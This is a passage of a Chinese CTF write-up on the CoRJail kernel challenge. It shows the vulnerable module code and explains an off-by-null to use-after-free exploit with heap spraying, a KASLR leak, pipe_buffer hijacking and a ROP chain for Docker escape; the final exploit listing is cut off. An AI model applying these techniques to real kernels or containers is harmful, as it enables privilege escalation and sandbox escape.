class="comment">--- a/kernel/trace/trace_syscalls.c	2022-06-29 08:59:54.000000000 +0200</span></span><br><span class="line"><span class="comment">+++ b/kernel/trace/trace_syscalls.c	2022-07-02 12:34:32.902426748 +0200</span></span><br><span class="line"><span class="meta">@@ -101,7 +101,7 @@</span></span><br><span class="line"> 	return NULL;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-static struct syscall_metadata *syscall_nr_to_meta(int nr)</span></span><br><span class="line"><span class="addition">+struct syscall_metadata *syscall_nr_to_meta(int nr)</span></span><br><span class="line"> &#123;</span><br><span class="line"> 	if (IS_ENABLED(CONFIG_HAVE_SPARSE_SYSCALL_NR))</span><br><span class="line"> 		return xa_load(&amp;syscalls_metadata_sparse, (unsigned long)nr);</span><br><span class="line"><span class="meta">@@ -111,6 +111,7 @@</span></span><br><span class="line"> </span><br><span class="line"> 	return syscalls_metadata[nr];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="addition">+EXPORT_SYMBOL(syscall_nr_to_meta);</span></span><br><span class="line"> </span><br><span class="line"> const char *get_syscall_name(int syscall)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="meta">@@ -122,6 +123,7 @@</span></span><br><span class="line"> </span><br><span class="line"> 	return entry-&gt;name;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="addition">+EXPORT_SYMBOL(get_syscall_name);</span></span><br><span class="line"> </span><br><span class="line"> static enum print_line_t</span><br><span class="line"> print_syscall_enter(struct trace_iterator *iter, int flags,</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>其中</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);</span><br></pre></td></tr></table></figure></div>

<p>为每个CPU都创建一个 <code>__per_cpu_syscall_count</code> 变量用来记录系统调用的次数。</p>
<hr>
<p><code>seccomp.json</code> 保存了系统调用的白名单。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;defaultAction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_ACT_ERRNO&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;defaultErrnoRet&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;syscalls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;names&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;_llseek&quot;</span><span class="punctuation">,</span> <span class="string">&quot;_newselect&quot;</span><span class="punctuation">,</span> <span class="string">&quot;accept&quot;</span><span class="punctuation">,</span> <span class="string">&quot;accept4&quot;</span><span class="punctuation">,</span> <span class="string">&quot;access&quot;</span><span class="punctuation">,</span> ... <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_ACT_ALLOW&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;names&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="string">&quot;clone&quot;</span> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_ACT_ALLOW&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">2114060288</span><span class="punctuation">,</span> <span class="attr">&quot;op&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_CMP_MASKED_EQ&quot;</span> <span class="punctuation">&#125;</span> <span class="punctuation">]</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>根据<code>README.md</code>提示，可以在<code>proc_rw/cormon</code>看到使用到的系统调用在各个<code>CPU</code>当中的情况。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@CoRJail:/<span class="comment"># cat /proc_rw/cormon </span></span><br><span class="line"></span><br><span class="line">      CPU0      CPU1      CPU2      CPU3	Syscall (NR)</span><br><span class="line"></span><br><span class="line">         9        16        25        18	sys_poll (7)</span><br><span class="line">         0         0         0         0	sys_fork (57)</span><br><span class="line">        66        64        79        60	sys_execve (59)</span><br><span class="line">         0         0         0         0	sys_msgget (68)</span><br><span class="line">         0         0         0         0	sys_msgsnd (69)</span><br><span class="line">         0         0         0         0	sys_msgrcv (70)</span><br><span class="line">         0         0         0         0	sys_ptrace (101)</span><br><span class="line">        15        19        11         6	sys_setxattr (188)</span><br><span class="line">        27        24        11        20	sys_keyctl (250)</span><br><span class="line">         0         0         2         2	sys_unshare (272)</span><br><span class="line">         0         1         0         0	sys_execveat (322)</span><br></pre></td></tr></table></figure></div>

<p>也可以指定系统调用。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@CoRJail:/<span class="comment"># echo -n &#x27;sys_msgsnd,sys_msgrcv&#x27; &gt; /proc_rw/cormon </span></span><br><span class="line">root@CoRJail:/<span class="comment"># cat /proc_rw/cormon </span></span><br><span class="line"></span><br><span class="line">      CPU0      CPU1      CPU2      CPU3	Syscall (NR)</span><br><span class="line"></span><br><span class="line">         0         0         0         0	sys_msgsnd (69)</span><br><span class="line">         0         0         0         0	sys_msgrcv (70)</span><br></pre></td></tr></table></figure></div>

<hr>
<p><strong>src.c</strong></p>
<p>可以看到 <code>write</code> 存在明显的<code>off-by-null</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">cormon_proc_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *ubuf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">loff_t</span> offset = *ppos;</span><br><span class="line">    <span class="type">char</span> *syscalls;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= PAGE_SIZE || !count)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    len = count &gt; PAGE_SIZE ? PAGE_SIZE - <span class="number">1</span> : count;</span><br><span class="line"></span><br><span class="line">    syscalls = kmalloc(PAGE_SIZE, GFP_ATOMIC);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[CoRMon::Debug] Syscalls @ %#llx\n&quot;</span>, (<span class="type">uint64_t</span>)syscalls);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!syscalls)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[CoRMon::Error] kmalloc() call failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(syscalls, ubuf, len))</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ERR <span class="string">&quot;[CoRMon::Error] copy_from_user() call failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    syscalls[len] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (update_filter(syscalls))</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(syscalls);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kfree(syscalls);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-22"><a href="#利用思路-22" class="headerlink" title="利用思路"></a>利用思路</h3><p>在 <code>poll_list</code> 利用方式中：</p>
<ul>
<li>先通过 <code>add_key()</code> 堆喷大量 <code>32</code> 字节大小的 <code>user_key_payload</code>。</li>
</ul>
<blockquote>
<p>这里只所以是 <code>32</code> 字节大小是因为要与后面的 <code>seq_operations</code> 配合，并且 <code>32</code> 大小的 <code>object</code> 其低字节是可能为 <code>\x00</code> 的，其低字节为 <code>0x20</code>、<code>0x40</code>、<code>0x80</code> 、<code>0xa0</code>、<code>0xc0</code>、<code>0xe0</code>、<code>0x00</code>。</p>
</blockquote>
<ul>
<li>然后创建 <code>poll_list</code> 链，其中 <code>poll_list.next</code> 指向的是一个 <code>0x20</code> 大小的 <code>object</code>。</li>
<li>触发 <code>off by null</code>，修改 <code>poll_list.next</code> 的低字节为 <code>\x00</code>，这里可能导致其指向某个 <code>user_key_payload</code>。</li>
<li>然后等待 <code>timeout</code> 后， 就会导致某个 <code>user_key_payload</code> 被释放，导致 <code>UAF</code>。</li>
</ul>
<p><strong>详细流程如下：</strong></p>
<p>首先，我们要打开有漏洞的模块。<br>使用<code>bind_core()</code>将当前进程绑定到CPU0，因为我们是在一个多核环境中工作，而slab是按CPU分配的。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>喷射大量 <code>0x20</code> 大小的 <code>user_key_payload</code> 和下图所示 <code>0x1000 + 0x20</code> 的 <code>poll_list</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png"
                      alt="99a7506313bfd15e5f0821cc7486cfb9"
                ></p>
<p>此时内存中 <code>object</code> 的分布如下图所示，其中黄色的是 <code>user_key_payload</code> ，绿色的是 <code>poll_list</code> ，白色是空闲 <code>object</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/26f0aa72bd11390b7b9790c1fa7cffe9.png"
                      alt="26f0aa72bd11390b7b9790c1fa7cffe9"
                ></p>
<p>通过 <code>off by null</code> 修改 0x1000 大小的 <code>poll_list</code> ，使得指向 <code>0x20</code> 大小 <code>poll_list</code> 的 <code>next</code> 指针指向 <code>user_key_payload</code> 。之后释放所有的 <code>poll_list</code> 结构，被 <code>next</code> 指向的的 <code>user_key_payload</code> 也被释放，形成 UAF 。</p>
<p>注意，为了确保释放 <code>poll_list</code> 不出错，要保证 <code>0x20</code> 大小的 <code>poll_list</code> 的 <code>next</code> 指针为 NULL 。也就是 <code>user_key_payload</code> 的前 8 字节为 NULL 。由于 <code>user_key_payload</code> 的前 8 字节没有初始化，因此可以在申请 <code>user_key_payload</code> 前先用 <code>setxattr</code> 把前 8 字节置为 NULL 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">	 <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line">	<span class="type">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line">	[...]</span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		[...]</span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL); <span class="comment">// 申请kmalloc-x</span></span><br><span class="line">		<span class="keyword">if</span> (!kvalue)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="comment">// 修改kmalloc-x内容</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		[...]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = vfs_setxattr(d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">	kvfree(kvalue); <span class="comment">// 释放kmalloc-x</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外实测 <code>kmalloc-32</code> 的 <code>freelist</code> 偏移为 16 字节，不会覆盖 <code>next</code> 指针。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png"
                      alt="64bfe90cc041bac53218ddde26656a27"
                ></p>
<p>喷射 <code>seq_operations</code> 利用 <code>seq_operations-&gt;next</code> 的低二字节覆盖 <code>user_key_payload-&gt;datalen</code> 实现 <code>user_key_payload</code> 越界读， <code>user_key_payload-&gt;data</code> 前 8 字节被覆盖为 <code>seq_operations-&gt;show</code> ，可以泄露内核基址。另外可以根据是否越界读判断该 <code>user_key_payload</code> 是否被 <code>seq_operations</code> 覆盖。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU destructor */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	datalen;	<span class="comment">/* length of this data */</span></span><br><span class="line">	<span class="type">char</span>		data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure></div>

<p>之后释放不能越界读的 <code>user_key_payload</code> 并喷射 <code>tty_file_private</code> 填充产生的空闲 <code>object</code> 。之后再次越界读泄露 <code>tty_file_private-&gt;tty</code> 指向的 <code>tty_struct</code> ，我们定义这个地址为 <code>target_object</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7c7268c0160ec64d50ada5c1787f789f.png"
                      alt="7c7268c0160ec64d50ada5c1787f789f"
                ></p>
<p>释放 <code>seq_operations</code> ，喷射 <code>0x20</code> 大小的 <code>poll_list</code> 。现在<code>UAF</code>的堆块被<code>user_key_payload</code>和<code>poll_list</code>占领。在 <code>poll_list</code> 被释放前，释放劫持的 <code>user_key_payload</code> ，利用 <code>setxattr</code> 修改 <code>poll_list</code> 的 <code>next</code> 指针指向 <code>target_object - 0x18</code>，方便后续伪造<code>pipe_buffer</code> 。为了实现 <code>setxattr</code> 的喷射效果，<code>setxattr</code> 修改过的 <code>object</code> 通过申请 <code>user_key_payload</code> 劫持，确保下次 <code>setxattr</code> 修改的是另外的 <code>object </code>。</p>
<blockquote>
<p>打开 <code>/dev/ptmx</code> 时会分配 <code>tty_file_private</code> 并且该结构体的 <code>tty</code> 指针会指向 <code>tty_struct</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tty_alloc_file</span><span class="params">(<span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">priv</span>;</span></span><br><span class="line"></span><br><span class="line">	priv = kmalloc(<span class="keyword">sizeof</span>(*priv), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!priv)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	file-&gt;private_data = priv;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// kmalloc-32 | GFP_KERNEL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18766f6b9f8a4dd92bab29f062fa6a7a.png"
                      alt="18766f6b9f8a4dd92bab29f062fa6a7a"
                ></p>
<p>趁 <code>poll_list</code> 还没有释放，释放 <code>tty_struct</code> 并申请 <code>pipe_buffer</code> ，将 <code>target_object(tty_struct)</code> 替换为 <code>pipe_buffer</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>之后 <code>poll_list</code> 释放导致 <code>target_object - 0x18</code> 区域释放。我们可以申请一个 <code>0x400</code> 大小的 <code>user_key_payload</code> 劫持 <code>target_object - 0x18</code> ，从而劫持 <code>pipe_buffer-&gt;ops</code> 实现控制流劫持。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18a655483165c8fc681c3e8dbf16c645.png"
                      alt="18a655483165c8fc681c3e8dbf16c645"
                ></p>
<p><strong>docker逃逸</strong></p>
<p>具体实现为修改 <code>task_struct</code> 的 <code>fs</code> 指向 <code>init_fs</code> 。用 <code>find_task_by_vpid()</code> 来定位<code>Docker</code>容器任务，我们用<code>switch_task_namespaces()</code>。但这还不足以从容器中逃逸。在<code>Docker</code>容器中，<code>setns()</code> 被 <code>seccomp</code>默认屏蔽了，我们可以克隆 <code>init_fs</code> 结构，然后用<code>find_task_by_vpid()</code>定位当前任务，用 <code>gadget</code> 手动安装新<code>fs_struct</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// commit_creds(&amp;init_creds)</span></span><br><span class="line">*rop++ = pop_rdi_ret;</span><br><span class="line">*rop++ = init_cred;</span><br><span class="line">*rop++ = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// current = find_task_by_vpid(getpid())</span></span><br><span class="line">*rop++ = pop_rdi_ret;</span><br><span class="line">*rop++ = getpid();</span><br><span class="line">*rop++ = find_task_by_vpid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// current-&gt;fs = &amp;init_fs</span></span><br><span class="line">*rop++ = pop_rcx_ret;</span><br><span class="line">*rop++ = <span class="number">0x6e0</span>;</span><br><span class="line">*rop++ = add_rax_rcx_ret;</span><br><span class="line">*rop++ = pop_rbx_ret;</span><br><span class="line">*rop++ = init_fs;</span><br><span class="line">*rop++ = mov_mmrax_rbx_pop_rbx_ret;</span><br><span class="line">rop++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 